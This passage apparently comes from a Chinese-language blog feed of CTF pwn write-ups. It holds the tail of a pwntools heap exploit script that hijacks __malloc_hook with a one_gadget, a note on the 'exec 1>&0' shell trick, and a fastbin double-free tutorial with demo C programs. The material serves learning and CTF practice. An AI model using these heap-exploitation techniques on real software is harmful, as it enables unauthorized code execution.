class="hljs-string">&#x27;__malloc_hook&#x27;</span> , malloc_hook)<br>base_addr = malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br><br><span class="hljs-comment">#----------------------fastbin-----------------------------#</span><br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">3</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x51</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) ,payload)<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#2</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">5</span>) <br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>success(<span class="hljs-string">&quot;malloc_hook : &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>success(<span class="hljs-string">&quot;fake_chunk : &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br><br>realloc_hook = base_addr + libc.dump(<span class="hljs-string">&#x27;realloc&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(realloc_hook))<br>one=[<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf1147</span>,<span class="hljs-number">0xf02a4</span>]//第二个偏移<span class="hljs-number">0</span>，第三个偏移<span class="hljs-number">4</span>，第四个偏移<span class="hljs-number">13</span><br>one_gadget = base_addr + one[<span class="hljs-number">3</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc_hook + <span class="hljs-number">13</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>onegadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wustctf2020_closed</title>
    <link href="/2024/08/03/wustctf2020-closed/"/>
    <url>/2024/08/03/wustctf2020-closed/</url>
    
    <content type="html"><![CDATA[<h2 id="IDA反编译伪代码"><a href="#IDA反编译伪代码" class="headerlink" title="IDA反编译伪代码"></a>IDA反编译伪代码</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408031805202.png" alt="ida反编译"></p><h2 id="文件相关知识"><a href="#文件相关知识" class="headerlink" title="文件相关知识"></a>文件相关知识</h2><p>这题就是一个Linux命令 exec 1&gt;&amp;0</p><p>现在来解释一下</p><ul><li>close(1);close(2);</li><li>我们的目的是要得到shell，官方wp给的是此处可以输入串：$0然后可以执行新的命令exec 1&gt;&amp;0以及其他以查看到flag</li><li>那么这条语句是什么意思呢？其中的0和1是指什么呢？<ul><li>0和1是linux下的文件描述符。</li><li>在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</li><li>标准输入输出的指向是默认的，我们可以修改它们的指向，也即重定位</li><li>举例子，可以用exec 1&gt;myoutput把标准输出重定向到myoutput文件中，也可以用exec 0&lt;myinput把标准输入重定向到myinput文件中，而且，文件名字可以用&amp;+文件描述符来代替。</li><li>那么问题到这里就解决了，三条语句中close(1);close(2)即把标准输出和标准错误输出关闭，然后我们可以执行 exec 1&gt;&amp;0，也就是把标准输出重定向到标准输入，因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了</li></ul></li></ul><h3 id="就是那么神奇😂"><a href="#就是那么神奇😂" class="headerlink" title="就是那么神奇😂"></a>就是那么神奇😂</h3>]]></content>
    
    
    <categories>
      
      <category>BUUCTF刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux命令</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2024/08/03/Fastbin-Attack/"/>
    <url>/2024/08/03/Fastbin-Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、UAF等能控制chunk内容的漏洞</li><li>漏洞发生于fastbin类型的chunk中</li></ul><p>fastbin attack大致可以分为一下几类：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中前两个漏洞侧重利用free函数释放<strong>真的chunk或伪造的chunk</strong>。然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc申请指定位置chunk进行攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-comment">//进行释放</span><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放前</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>执行三次 free 进行释放后</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602040</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Fastbins[<span class="hljs-attribute">idx</span>=2, <span class="hljs-attribute">size</span>=0x30,ptr=0x602080]<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602040, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x000000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br></code></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>astbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li><li>存在UAF漏洞</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*** Error in `./tst&#x27;: double free or corruption (fasttop): 0x<span class="hljs-number">00000000022000</span>10 ***<br>======= Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]<br>/lib/x86_64-linux-gnu/libc.so.6(+0x<span class="hljs-number">8037</span>a)[0x7fbb7a<span class="hljs-number">3753</span>7a]<br>/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a<span class="hljs-number">3795</span>3c]<br>./tst[0x<span class="hljs-number">4005</span>a2]<br>/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a<span class="hljs-number">315830</span>]<br>./tst[0x<span class="hljs-number">400499</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000-004010</span>00 r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000-006010</span>00 r--p <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000-006020</span>00 rw-p <span class="hljs-number">00001000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">02200000-022210</span>00 rw-p <span class="hljs-number">00000000</span> 00:00 0                                  [heap]<br>7fbb<span class="hljs-number">74000000</span>-7fbb<span class="hljs-number">74021000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb<span class="hljs-number">74021000</span>-7fbb<span class="hljs-number">78000000</span> ---p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a0df000-7fbb7a0f<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a0f<span class="hljs-number">5000</span>-7fbb7a2f<span class="hljs-number">4000</span> ---p <span class="hljs-number">00016000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">4000</span>-7fbb7a2f<span class="hljs-number">5000</span> rw-p <span class="hljs-number">00015000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">5000</span>-7fbb7a4b<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a4b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">5000</span> ---p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">9000</span> r--p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">9000</span>-7fbb7a6bb000 rw-p 001c<span class="hljs-number">4000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6bb000-7fbb7a6bf000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a6bf000-7fbb7a6e<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8c<span class="hljs-number">7000</span>-7fbb7a8ca000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">1000</span>-7fbb7a8e<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">4000</span>-7fbb7a8e<span class="hljs-number">5000</span> r--p <span class="hljs-number">00025000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">5000</span>-7fbb7a8e<span class="hljs-number">6000</span> rw-p <span class="hljs-number">00026000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">6000</span>-7fbb7a8e<span class="hljs-number">7000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7ffcd2f<span class="hljs-number">9300</span>0-7ffcd2fb<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0                          [stack]<br>7ffcd2fc<span class="hljs-number">8000</span>-7ffcd2fca000 r--p <span class="hljs-number">00000000</span> 00:00 0                          [vvar]<br>7ffcd2fca000-7ffcd2fcc000 r-xp <span class="hljs-number">00000000</span> 00:00 0                          [vdso]<br>ffffffffff<span class="hljs-number">600000</span>-ffffffffff<span class="hljs-number">601000</span> r-xp <span class="hljs-number">00000000</span> 00:00 0                  [vsyscall]<br>已放弃 (核心已转储)<br></code></pre></td></tr></table></figure><p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258336.png"></p><p>第二次释放<code>free(chunk2)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258513.png"></p><p>第三次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258763.png"></p><p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena&#x3D;&gt;chunk1&#x3D;&gt;chun2&#x3D;&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> pre_size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fd;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-type">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于 bss 段中正是我们之前设置的</p><p>CHUNK bss_chunk</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">CHUNK bss_chunk<br>Start              End                Offset             Perm Path<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000400000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000401000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-x /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000600000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000001000</span> rw- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000623000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> rw- [heap]<br><br><span class="hljs-number">0x601080</span> &lt;bss_chunk&gt;:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x601090</span> &lt;bss_chunk+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010a0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010b0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010c0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p><figure class="highlight dns"><table><tr><td 